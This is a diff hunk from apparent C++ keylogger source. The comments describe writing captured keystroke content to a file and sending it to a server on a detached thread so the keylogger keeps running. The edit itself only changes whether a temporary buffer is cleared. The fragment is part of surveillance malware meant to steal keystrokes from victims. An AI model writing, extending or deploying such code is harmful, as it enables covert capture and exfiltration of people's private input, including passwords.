@@ -630,7 +630,7 @@ static void timeCheck() {
 		// resetting the contentFile
 		contentFile = StartString();
 		std::ofstream outputFile(FilePath);
-		!(outputFile.is_open()) ?: (outputFile << tmp, outputFile.close(), tmp = "");
+		!(outputFile.is_open()) ?: (outputFile << tmp, outputFile.close());
 		// sending the file to the server, and remove it into the thread
 		std::thread tSend(makeRequest);
 		// detach the thread from the execution, so I can send the file without stopping the keylogger
